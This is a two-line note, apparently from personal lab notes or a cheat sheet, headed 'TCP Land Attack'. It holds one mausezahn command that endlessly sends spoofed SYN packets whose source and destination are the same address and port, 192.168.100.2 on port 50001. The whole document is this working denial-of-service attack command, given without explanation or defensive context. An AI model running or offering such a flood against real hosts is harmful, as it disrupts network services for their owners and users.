# TCP Land Attack (command)
sudo mausezahn enp0s3 -A 192.168.100.2 -B 192.168.100.2 -t tcp "sp=50001, dp=50001,flags=syn, win=8192" -c 0